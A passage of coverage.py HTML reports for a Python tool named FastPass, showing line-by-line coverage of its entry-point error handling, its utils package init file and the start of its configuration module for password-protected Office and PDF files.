    <p class="pln"><span class="n"><a id="t247" href="#t247">247</a></span><span class="t">        <span class="com"># A1h: Read User's Commands</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t248" href="#t248">248</a></span><span class="t">        <span class="com"># Process the command-line instructions user provided</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t249" href="#t249">249</a></span><span class="t">        <span class="com"># Handle cases where user asks for help or makes errors</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t250" href="#t250">250</a></span><span class="t">        <span class="nam">args</span> <span class="op">=</span> <span class="nam">parse_command_line_arguments</span><span class="op">(</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t251" href="#t251">251</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t252" href="#t252">252</a></span><span class="t">        <span class="com"># A1i: Handle Information Requests</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t253" href="#t253">253</a></span><span class="t">        <span class="key">if</span> <span class="nam">hasattr</span><span class="op">(</span><span class="nam">args</span><span class="op">,</span> <span class="str">'list_supported'</span><span class="op">)</span> <span class="key">and</span> <span class="nam">args</span><span class="op">.</span><span class="nam">list_supported</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t254" href="#t254">254</a></span><span class="t">            <span class="key">return</span> <span class="nam">display_information_and_exit</span><span class="op">(</span><span class="nam">args</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t255" href="#t255">255</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t256" href="#t256">256</a></span><span class="t">        <span class="com"># A3a-A3e: Enhanced Logging Setup</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t257" href="#t257">257</a></span><span class="t">        <span class="nam">logger</span> <span class="op">=</span> <span class="nam">setup_logger</span><span class="op">(</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t258" href="#t258">258</a></span><span class="t">            <span class="nam">debug</span><span class="op">=</span><span class="nam">getattr</span><span class="op">(</span><span class="nam">args</span><span class="op">,</span> <span class="str">'debug'</span><span class="op">,</span> <span class="key">False</span><span class="op">)</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t259" href="#t259">259</a></span><span class="t">            <span class="nam">log_file</span><span class="op">=</span><span class="nam">getattr</span><span class="op">(</span><span class="nam">args</span><span class="op">,</span> <span class="str">'log_file'</span><span class="op">,</span> <span class="key">None</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t260" href="#t260">260</a></span><span class="t">        <span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t261" href="#t261">261</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t262" href="#t262">262</a></span><span class="t">        <span class="com"># A3e: Record Program Startup with Config</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t263" href="#t263">263</a></span><span class="t">        <span class="nam">logger</span><span class="op">.</span><span class="nam">info</span><span class="op">(</span><span class="fst">f"</span><span class="fst">FastPass v</span><span class="op">{</span><span class="nam">FastPassConfig</span><span class="op">.</span><span class="nam">VERSION</span><span class="op">}</span><span class="fst"> starting</span><span class="fst">"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t264" href="#t264">264</a></span><span class="t">        <span class="nam">logger</span><span class="op">.</span><span class="nam">debug</span><span class="op">(</span><span class="fst">f"</span><span class="fst">Operation: </span><span class="op">{</span><span class="nam">args</span><span class="op">.</span><span class="nam">operation</span><span class="op">}</span><span class="fst">"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t265" href="#t265">265</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t266" href="#t266">266</a></span><span class="t">        <span class="com"># Validate arguments</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t267" href="#t267">267</a></span><span class="t">        <span class="nam">validate_arguments</span><span class="op">(</span><span class="nam">args</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t268" href="#t268">268</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t269" href="#t269">269</a></span><span class="t">        <span class="com"># Handle stdin passwords</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t270" href="#t270">270</a></span><span class="t">        <span class="nam">handle_stdin_passwords</span><span class="op">(</span><span class="nam">args</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t271" href="#t271">271</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t272" href="#t272">272</a></span><span class="t">        <span class="com"># Load configuration</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t273" href="#t273">273</a></span><span class="t">        <span class="nam">config</span> <span class="op">=</span> <span class="nam">FastPassConfig</span><span class="op">.</span><span class="nam">load_configuration</span><span class="op">(</span><span class="nam">args</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t274" href="#t274">274</a></span><span class="t">        <span class="nam">logger</span><span class="op">.</span><span class="nam">debug</span><span class="op">(</span><span class="fst">f"</span><span class="fst">Configuration loaded: </span><span class="op">{</span><span class="nam">len</span><span class="op">(</span><span class="nam">config</span><span class="op">)</span><span class="op">}</span><span class="fst"> settings</span><span class="fst">"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t275" href="#t275">275</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t276" href="#t276">276</a></span><span class="t">        <span class="com"># Import and run main application</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t277" href="#t277">277</a></span><span class="t">        <span class="key">from</span> <span class="nam">app</span> <span class="key">import</span> <span class="nam">FastPassApplication</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t278" href="#t278">278</a></span><span class="t">        <span class="nam">app</span> <span class="op">=</span> <span class="nam">FastPassApplication</span><span class="op">(</span><span class="nam">args</span><span class="op">,</span> <span class="nam">logger</span><span class="op">,</span> <span class="nam">config</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t279" href="#t279">279</a></span><span class="t">        <span class="key">return</span> <span class="nam">app</span><span class="op">.</span><span class="nam">run</span><span class="op">(</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t280" href="#t280">280</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t281" href="#t281">281</a></span><span class="t">    <span class="key">except</span> <span class="nam">ValueError</span> <span class="key">as</span> <span class="nam">e</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t282" href="#t282">282</a></span><span class="t">        <span class="com"># A1h_Error: Invalid User Input</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t283" href="#t283">283</a></span><span class="t">        <span class="nam">print</span><span class="op">(</span><span class="fst">f"</span><span class="fst">Error: </span><span class="op">{</span><span class="nam">sanitize_error_message</span><span class="op">(</span><span class="nam">str</span><span class="op">(</span><span class="nam">e</span><span class="op">)</span><span class="op">)</span><span class="op">}</span><span class="fst">"</span><span class="op">,</span> <span class="nam">file</span><span class="op">=</span><span class="nam">sys</span><span class="op">.</span><span class="nam">stderr</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t284" href="#t284">284</a></span><span class="t">        <span class="key">return</span> <span class="num">2</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t285" href="#t285">285</a></span><span class="t">    <span class="key">except</span> <span class="nam">KeyboardInterrupt</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t286" href="#t286">286</a></span><span class="t">        <span class="nam">print</span><span class="op">(</span><span class="str">"\nOperation cancelled by user"</span><span class="op">,</span> <span class="nam">file</span><span class="op">=</span><span class="nam">sys</span><span class="op">.</span><span class="nam">stderr</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t287" href="#t287">287</a></span><span class="t">        <span class="key">return</span> <span class="num">1</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t288" href="#t288">288</a></span><span class="t">    <span class="key">except</span> <span class="nam">Exception</span> <span class="key">as</span> <span class="nam">e</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t289" href="#t289">289</a></span><span class="t">        <span class="com"># Unexpected error</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t290" href="#t290">290</a></span><span class="t">        <span class="nam">print</span><span class="op">(</span><span class="fst">f"</span><span class="fst">Unexpected error: </span><span class="op">{</span><span class="nam">sanitize_error_message</span><span class="op">(</span><span class="nam">str</span><span class="op">(</span><span class="nam">e</span><span class="op">)</span><span class="op">)</span><span class="op">}</span><span class="fst">"</span><span class="op">,</span> <span class="nam">file</span><span class="op">=</span><span class="nam">sys</span><span class="op">.</span><span class="nam">stderr</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t291" href="#t291">291</a></span><span class="t">        <span class="key">return</span> <span class="num">2</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t292" href="#t292">292</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t293" href="#t293">293</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t294" href="#t294">294</a></span><span class="t"><span class="key">if</span> <span class="nam">__name__</span> <span class="op">==</span> <span class="str">"__main__"</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t295" href="#t295">295</a></span><span class="t">    <span class="nam">sys</span><span class="op">.</span><span class="nam">exit</span><span class="op">(</span><span class="nam">main</span><span class="op">(</span><span class="op">)</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
</main>
<footer>
    <div class="content">
        <p>
            <a class="nav" href="z_145eef247bfb46b6_app_py.html">&#xab; prev</a> &nbsp; &nbsp;
            <a class="nav" href="index.html">&Hat; index</a> &nbsp; &nbsp;
            <a class="nav" href="z_ce21df766c911d41___init___py.html">&#xbb; next</a>
            &nbsp; &nbsp; &nbsp;
            <a class="nav" href="https://coverage.readthedocs.io/en/7.10.0">coverage.py v7.10.0</a>,
            created at 2025-07-26 17:08 -0400
        </p>
    </div>
</footer>
</body>
</html>
</file>

<file path="reports/coverage/z_6156a86a215061be___init___py.html">
<!DOCTYPE html>
<html lang="en">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <title>Coverage for src\utils\__init__.py: 100%</title>
    <link rel="icon" sizes="32x32" href="favicon_32_cb_58284776.png">
    <link rel="stylesheet" href="style_cb_dca529e9.css" type="text/css">
    <script src="coverage_html_cb_497bf287.js" defer></script>
</head>
<body class="pyfile">
<header>
    <div class="content">
        <h1>
            <span class="text">Coverage for </span><b>src\utils\__init__.py</b>:
            <span class="pc_cov">100%</span>
        </h1>
        <aside id="help_panel_wrapper">
            <input id="help_panel_state" type="checkbox">
            <label for="help_panel_state">
                <img id="keyboard_icon" src="keybd_closed_cb_ce680311.png" alt="Show/hide keyboard shortcuts">
            </label>
            <div id="help_panel">
                <p class="legend">Shortcuts on this page</p>
                <div class="keyhelp">
                    <p>
                        <kbd>r</kbd>
                        <kbd>m</kbd>
                        <kbd>x</kbd>
                        &nbsp; toggle line displays
                    </p>
                    <p>
                        <kbd>j</kbd>
                        <kbd>k</kbd>
                        &nbsp; next/prev highlighted chunk
                    </p>
                    <p>
                        <kbd>0</kbd> &nbsp; (zero) top of page
                    </p>
                    <p>
                        <kbd>1</kbd> &nbsp; (one) first highlighted chunk
                    </p>
                    <p>
                        <kbd>[</kbd>
                        <kbd>]</kbd>
                        &nbsp; prev/next file
                    </p>
                    <p>
                        <kbd>u</kbd> &nbsp; up to the index
                    </p>
                    <p>
                        <kbd>?</kbd> &nbsp; show/hide this help
                    </p>
                </div>
            </div>
        </aside>
        <h2>
            <span class="text">3 statements &nbsp;</span>
            <button type="button" class="run button_toggle_run" value="run" data-shortcut="r" title="Toggle lines run">3<span class="text"> run</span></button>
            <button type="button" class="mis show_mis button_toggle_mis" value="mis" data-shortcut="m" title="Toggle lines missing">0<span class="text"> missing</span></button>
            <button type="button" class="exc show_exc button_toggle_exc" value="exc" data-shortcut="x" title="Toggle lines excluded">0<span class="text"> excluded</span></button>
        </h2>
        <p class="text">
            <a id="prevFileLink" class="nav" href="z_ce21df766c911d41_security_py.html">&#xab; prev</a> &nbsp; &nbsp;
            <a id="indexLink" class="nav" href="index.html">&Hat; index</a> &nbsp; &nbsp;
            <a id="nextFileLink" class="nav" href="z_6156a86a215061be_config_py.html">&#xbb; next</a>
            &nbsp; &nbsp; &nbsp;
            <a class="nav" href="https://coverage.readthedocs.io/en/7.10.0">coverage.py v7.10.0</a>,
            created at 2025-07-26 17:08 -0400
        </p>
        <aside class="hidden">
            <button type="button" class="button_next_chunk" data-shortcut="j"></button>
            <button type="button" class="button_prev_chunk" data-shortcut="k"></button>
            <button type="button" class="button_top_of_page" data-shortcut="0"></button>
            <button type="button" class="button_first_chunk" data-shortcut="1"></button>
            <button type="button" class="button_prev_file" data-shortcut="["></button>
            <button type="button" class="button_next_file" data-shortcut="]"></button>
            <button type="button" class="button_to_index" data-shortcut="u"></button>
            <button type="button" class="button_show_hide_help" data-shortcut="?"></button>
        </aside>
    </div>
</header>
<main id="source">
    <p class="pln"><span class="n"><a id="t1" href="#t1">1</a></span><span class="t"><span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t2" href="#t2">2</a></span><span class="t"><span class="str">FastPass Utility Modules</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t3" href="#t3">3</a></span><span class="t"><span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t4" href="#t4">4</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t5" href="#t5">5</a></span><span class="t"><span class="key">from</span> <span class="op">.</span><span class="nam">config</span> <span class="key">import</span> <span class="nam">FastPassConfig</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t6" href="#t6">6</a></span><span class="t"><span class="key">from</span> <span class="op">.</span><span class="nam">logger</span> <span class="key">import</span> <span class="nam">setup_logger</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t7" href="#t7">7</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t8" href="#t8">8</a></span><span class="t"><span class="nam">__all__</span> <span class="op">=</span> <span class="op">[</span><span class="str">'FastPassConfig'</span><span class="op">,</span> <span class="str">'setup_logger'</span><span class="op">]</span>&nbsp;</span><span class="r"></span></p>
</main>
<footer>
    <div class="content">
        <p>
            <a class="nav" href="z_ce21df766c911d41_security_py.html">&#xab; prev</a> &nbsp; &nbsp;
            <a class="nav" href="index.html">&Hat; index</a> &nbsp; &nbsp;
            <a class="nav" href="z_6156a86a215061be_config_py.html">&#xbb; next</a>
            &nbsp; &nbsp; &nbsp;
            <a class="nav" href="https://coverage.readthedocs.io/en/7.10.0">coverage.py v7.10.0</a>,
            created at 2025-07-26 17:08 -0400
        </p>
    </div>
</footer>
</body>
</html>
</file>

<file path="reports/coverage/z_6156a86a215061be_config_py.html">
<!DOCTYPE html>
<html lang="en">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <title>Coverage for src\utils\config.py: 73%</title>
    <link rel="icon" sizes="32x32" href="favicon_32_cb_58284776.png">
    <link rel="stylesheet" href="style_cb_dca529e9.css" type="text/css">
    <script src="coverage_html_cb_497bf287.js" defer></script>
</head>
<body class="pyfile">
<header>
    <div class="content">
        <h1>
            <span class="text">Coverage for </span><b>src\utils\config.py</b>:
            <span class="pc_cov">73%</span>
        </h1>
        <aside id="help_panel_wrapper">
            <input id="help_panel_state" type="checkbox">
            <label for="help_panel_state">
                <img id="keyboard_icon" src="keybd_closed_cb_ce680311.png" alt="Show/hide keyboard shortcuts">
            </label>
            <div id="help_panel">
                <p class="legend">Shortcuts on this page</p>
                <div class="keyhelp">
                    <p>
                        <kbd>r</kbd>
                        <kbd>m</kbd>
                        <kbd>x</kbd>
                        &nbsp; toggle line displays
                    </p>
                    <p>
                        <kbd>j</kbd>
                        <kbd>k</kbd>
                        &nbsp; next/prev highlighted chunk
                    </p>
                    <p>
                        <kbd>0</kbd> &nbsp; (zero) top of page
                    </p>
                    <p>
                        <kbd>1</kbd> &nbsp; (one) first highlighted chunk
                    </p>
                    <p>
                        <kbd>[</kbd>
                        <kbd>]</kbd>
                        &nbsp; prev/next file
                    </p>
                    <p>
                        <kbd>u</kbd> &nbsp; up to the index
                    </p>
                    <p>
                        <kbd>?</kbd> &nbsp; show/hide this help
                    </p>
                </div>
            </div>
        </aside>
        <h2>
            <span class="text">52 statements &nbsp;</span>
            <button type="button" class="run button_toggle_run" value="run" data-shortcut="r" title="Toggle lines run">38<span class="text"> run</span></button>
            <button type="button" class="mis show_mis button_toggle_mis" value="mis" data-shortcut="m" title="Toggle lines missing">14<span class="text"> missing</span></button>
            <button type="button" class="exc show_exc button_toggle_exc" value="exc" data-shortcut="x" title="Toggle lines excluded">0<span class="text"> excluded</span></button>
        </h2>
        <p class="text">
            <a id="prevFileLink" class="nav" href="z_6156a86a215061be___init___py.html">&#xab; prev</a> &nbsp; &nbsp;
            <a id="indexLink" class="nav" href="index.html">&Hat; index</a> &nbsp; &nbsp;
            <a id="nextFileLink" class="nav" href="z_6156a86a215061be_logger_py.html">&#xbb; next</a>
            &nbsp; &nbsp; &nbsp;
            <a class="nav" href="https://coverage.readthedocs.io/en/7.10.0">coverage.py v7.10.0</a>,
            created at 2025-07-26 17:08 -0400
        </p>
        <aside class="hidden">
            <button type="button" class="button_next_chunk" data-shortcut="j"></button>
            <button type="button" class="button_prev_chunk" data-shortcut="k"></button>
            <button type="button" class="button_top_of_page" data-shortcut="0"></button>
            <button type="button" class="button_first_chunk" data-shortcut="1"></button>
            <button type="button" class="button_prev_file" data-shortcut="["></button>
            <button type="button" class="button_next_file" data-shortcut="]"></button>
            <button type="button" class="button_to_index" data-shortcut="u"></button>
            <button type="button" class="button_show_hide_help" data-shortcut="?"></button>
        </aside>
    </div>
</header>
<main id="source">
    <p class="pln"><span class="n"><a id="t1" href="#t1">1</a></span><span class="t"><span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t2" href="#t2">2</a></span><span class="t"><span class="str">FastPass Configuration Management System</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t3" href="#t3">3</a></span><span class="t"><span class="str">Maps to: CONFIGURATION MANAGEMENT SYSTEM from flowchart</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t4" href="#t4">4</a></span><span class="t"><span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t5" href="#t5">5</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t6" href="#t6">6</a></span><span class="t"><span class="com"># A1a: Load System Tools</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t7" href="#t7">7</a></span><span class="t"><span class="key">import</span> <span class="nam">json</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t8" href="#t8">8</a></span><span class="t"><span class="key">import</span> <span class="nam">os</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t9" href="#t9">9</a></span><span class="t"><span class="key">from</span> <span class="nam">pathlib</span> <span class="key">import</span> <span class="nam">Path</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t10" href="#t10">10</a></span><span class="t"><span class="key">from</span> <span class="nam">typing</span> <span class="key">import</span> <span class="nam">Dict</span><span class="op">,</span> <span class="nam">Any</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t11" href="#t11">11</a></span><span class="t"><span class="key">import</span> <span class="nam">argparse</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t12" href="#t12">12</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t13" href="#t13">13</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t14" href="#t14">14</a></span><span class="t"><span class="key">class</span> <span class="nam">FastPassConfig</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t15" href="#t15">15</a></span><span class="t">    <span class="str">"""Configuration management with multiple sources and precedence"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t16" href="#t16">16</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t17" href="#t17">17</a></span><span class="t">    <span class="com"># CONFIGURATION MANAGEMENT SYSTEM constants</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t18" href="#t18">18</a></span><span class="t">    <span class="nam">VERSION</span> <span class="op">=</span> <span class="str">"1.0.0"</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t19" href="#t19">19</a></span><span class="t">    <span class="nam">MAX_FILE_SIZE</span> <span class="op">=</span> <span class="num">500</span> <span class="op">*</span> <span class="num">1024</span> <span class="op">*</span> <span class="num">1024</span>  <span class="com"># 500MB</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t20" href="#t20">20</a></span><span class="t">    <span class="nam">TEMP_DIR_PREFIX</span> <span class="op">=</span> <span class="str">"fastpass_"</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t21" href="#t21">21</a></span><span class="t">    <span class="nam">SECURE_FILE_PERMISSIONS</span> <span class="op">=</span> <span class="num">0o600</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t22" href="#t22">22</a></span><span class="t">    <span class="nam">SUPPORTED_FORMATS</span> <span class="op">=</span> <span class="op">{</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t23" href="#t23">23</a></span><span class="t">        <span class="str">'.docx'</span><span class="op">:</span> <span class="str">'msoffcrypto'</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t24" href="#t24">24</a></span><span class="t">        <span class="str">'.xlsx'</span><span class="op">:</span> <span class="str">'msoffcrypto'</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t25" href="#t25">25</a></span><span class="t">        <span class="str">'.pptx'</span><span class="op">:</span> <span class="str">'msoffcrypto'</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t26" href="#t26">26</a></span><span class="t">        <span class="str">'.docm'</span><span class="op">:</span> <span class="str">'msoffcrypto'</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t27" href="#t27">27</a></span><span class="t">        <span class="str">'.xlsm'</span><span class="op">:</span> <span class="str">'msoffcrypto'</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t28" href="#t28">28</a></span><span class="t">        <span class="str">'.pptm'</span><span class="op">:</span> <span class="str">'msoffcrypto'</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t29" href="#t29">29</a></span><span class="t">        <span class="str">'.dotx'</span><span class="op">:</span> <span class="str">'msoffcrypto'</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t30" href="#t30">30</a></span><span class="t">        <span class="str">'.xltx'</span><span class="op">:</span> <span class="str">'msoffcrypto'</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t31" href="#t31">31</a></span><span class="t">        <span class="str">'.potx'</span><span class="op">:</span> <span class="str">'msoffcrypto'</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t32" href="#t32">32</a></span><span class="t">        <span class="str">'.pdf'</span><span class="op">:</span> <span class="str">'PyPDF2'</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t33" href="#t33">33</a></span><span class="t">    <span class="op">}</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t34" href="#t34">34</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t35" href="#t35">35</a></span><span class="t">    <span class="com"># Configuration file locations (in order of precedence)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t36" href="#t36">36</a></span><span class="t">    <span class="nam">CONFIG_LOCATIONS</span> <span class="op">=</span> <span class="op">[</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t37" href="#t37">37</a></span><span class="t">        <span class="nam">Path</span><span class="op">.</span><span class="nam">home</span><span class="op">(</span><span class="op">)</span> <span class="op">/</span> <span class="str">'.fastpass'</span> <span class="op">/</span> <span class="str">'config.json'</span><span class="op">,</span>  <span class="com"># User config</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t38" href="#t38">38</a></span><span class="t">        <span class="nam">Path</span><span class="op">.</span><span class="nam">cwd</span><span class="op">(</span><span class="op">)</span> <span class="op">/</span> <span class="str">'fastpass.json'</span><span class="op">,</span>               <span class="com"># Project config</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t39" href="#t39">39</a></span><span class="t">        <span class="nam">Path</span><span class="op">(</span><span class="nam">__file__</span><span class="op">)</span><span class="op">.</span><span class="nam">parent</span><span class="op">.</span><span class="nam">parent</span> <span class="op">/</span> <span class="str">'config.json'</span>  <span class="com"># Default config</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t40" href="#t40">40</a></span><span class="t">    <span class="op">]</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t41" href="#t41">41</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t42" href="#t42">42</a></span><span class="t">    <span class="op">@</span><span class="nam">classmethod</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t43" href="#t43">43</a></span><span class="t">    <span class="key">def</span> <span class="nam">load_configuration</span><span class="op">(</span><span class="nam">cls</span><span class="op">,</span> <span class="nam">cli_args</span><span class="op">:</span> <span class="nam">argparse</span><span class="op">.</span><span class="nam">Namespace</span><span class="op">)</span> <span class="op">-></span> <span class="nam">Dict</span><span class="op">[</span><span class="nam">str</span><span class="op">,</span> <span class="nam">Any</span><span class="op">]</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t44" href="#t44">44</a></span><span class="t">        <span class="str">"""Load configuration from multiple sources with precedence"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t45" href="#t45">45</a></span><span class="t">        <span class="nam">config</span> <span class="op">=</span> <span class="nam">cls</span><span class="op">.</span><span class="nam">_get_default_config</span><span class="op">(</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t46" href="#t46">46</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t47" href="#t47">47</a></span><span class="t">        <span class="com"># 1. Load from config files (lowest precedence)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t48" href="#t48">48</a></span><span class="t">        <span class="key">for</span> <span class="nam">config_path</span> <span class="key">in</span> <span class="nam">cls</span><span class="op">.</span><span class="nam">CONFIG_LOCATIONS</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t49" href="#t49">49</a></span><span class="t">            <span class="key">if</span> <span class="nam">config_path</span><span class="op">.</span><span class="nam">exists</span><span class="op">(</span><span class="op">)</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t50" href="#t50">50</a></span><span class="t">                <span class="key">try</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t51" href="#t51">51</a></span><span class="t">                    <span class="key">with</span> <span class="nam">open</span><span class="op">(</span><span class="nam">config_path</span><span class="op">,</span> <span class="str">'r'</span><span class="op">)</span> <span class="key">as</span> <span class="nam">f</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
